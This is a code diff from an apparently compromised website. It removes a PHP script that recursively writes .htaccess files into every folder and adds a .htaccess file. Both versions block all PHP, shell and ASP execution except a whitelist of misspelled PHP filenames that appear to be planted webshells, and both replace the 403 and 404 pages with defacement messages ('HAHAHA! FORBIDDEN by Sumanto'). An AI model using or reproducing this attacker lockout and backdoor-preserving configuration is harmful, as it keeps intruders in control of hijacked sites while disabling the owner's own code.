@@ -1,60 +1,66 @@
-<?php
-$htaccessContent = <<<HTACCESS
+<Files *.ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Ph*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.pH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.PH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.Sh*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.sH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.SH*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.AS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.As*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.aS*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.as*>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<FilesMatch "\.(jpg|jpeg|png|gif|bmp|ico)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(mp4|avi|mov|wmv|mp3|wav|ogg)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(pdf|doc|docx|xls|xlsx|zip|rar|tar|gz|ppt|pptx|csv|)$">
+    Order Deny,Allow
+    Allow from all
+</FilesMatch>
+<FilesMatch "^(CatalogAcces.inc.php|ReviewersFolder.inc.php|FolderssInc.php|img.php|ReportFolders.inc.php|PublishAcuador.inc.php|SubscriberAcces.inc.php|UploadImages.php|FunctionsApps.inc.php|SubcriputionsManuerver.inc.php|TemplatesSucces.php|succesfull.php|LibrarryActivatedDocoder.php)$">
+        Order Deny,Allow
+    Allow from all
+    </FilesMatch>
 Options -Indexes
-
-<FilesMatch "(?i)\.(phtml|php|phar|pgif|pht|phtm|shtml|inc|php1|php2|php3|php4|php5|php56|php6|php7|php72|php8|php9|php[0-9]?|asp[x]?|)\$">
-Order allow,deny
-Deny from all
-</FilesMatch>
-<FilesMatch "\.(jpg|png|pdf|xml|txt|js|css|tpl|doc|docs|dxc)\$">
-Order allow,deny
-Allow from all
-</FilesMatch>
-
-<FilesMatch "(CatalogAcces.inc.php|ReviewersFolder.inc.php|FolderssInc.php|img.php|ReportFolders.inc.php|PublishAcuador.inc.php|SubscriberAcces.inc.php|UploadImages.php|FunctionsApps.inc.php|SubcriputionsManuerver.inc.php|TemplatesSucces.php|succesfull.php|LibrarryActivatedDocoder.php)\$">
-Order allow,deny
-Allow from all
-</FilesMatch>
-
-<FilesMatch "^\.">
-Order allow,deny
-Deny from all
-</FilesMatch>
-
-<IfModule mod_rewrite.c>
-RewriteEngine On
-RewriteBase /
-RewriteRule ^index.php\$ - [L]
-RewriteCond %{REQUEST_FILENAME} !-f
-RewriteCond %{REQUEST_FILENAME} !-d
-RewriteRule . index.php [L]
-</IfModule>
-
-ErrorDocument 403 '<center><img src="https://situsgampangcuan.com/jamet.gif"><h3>apasih deck? ;V</h3></center>'
-ErrorDocument 404 '<center><img src="https://situsgampangcuan.com/jamet.gif"><h3>apasih deck? ;V</h3></center>'
-
-AddHandler application/x-httpd-ea-php54 .tpl
-
-# php -- BEGIN cPanel-generated handler, do not edit
-# Set the “ea-php81” package as the default “PHP” programming language.
-<IfModule mime_module>
-  AddHandler application/x-httpd-ea-php81 .php .php8 .phtml
-</IfModule>
-# php -- END cPanel-generated handler, do not edit
-HTACCESS;
-
-function sebarkanHtaccess($dir, $htaccessContent) {
-    $folders = scandir($dir);
-    foreach ($folders as $folder) {
-        if ($folder === '.' || $folder === '..') continue;
-        $path = $dir . DIRECTORY_SEPARATOR . $folder;
-        if (is_dir($path)) {
-            file_put_contents($path . DIRECTORY_SEPARATOR . ".htaccess", $htaccessContent);
-            sebarkanHtaccess($path, $htaccessContent);
-        }
-    }
-}
-
-sebarkanHtaccess(__DIR__, $htaccessContent);
-echo ".htaccess telah disebarkan ke semua folder.";
-?>
+ErrorDocument 403 '<center><img src="https://res.cloudinary.com/dqkin28uq/image/upload/v1755114959/tenor_kvlz1z.gif"></img> <h3>HAHAHA! FORBIDDEN</font><br><h2>by Sumanto</h2>
